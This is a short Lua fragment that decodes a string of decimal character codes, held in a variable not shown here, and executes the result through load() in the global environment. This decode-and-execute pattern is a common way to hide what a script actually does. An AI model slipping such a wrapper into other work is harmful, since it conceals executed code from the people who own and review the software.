local function fromASCII(str)
local bytes={}
for num in str:gmatch("%d+")do
table.insert(bytes,string.char(tonumber(num)))
end
return table.concat(bytes)
end
local decodedCode=fromASCII(encodedCode)
local f=assert(load(decodedCode,"=wrapper","bt",_G),"Script loading failed")
f()
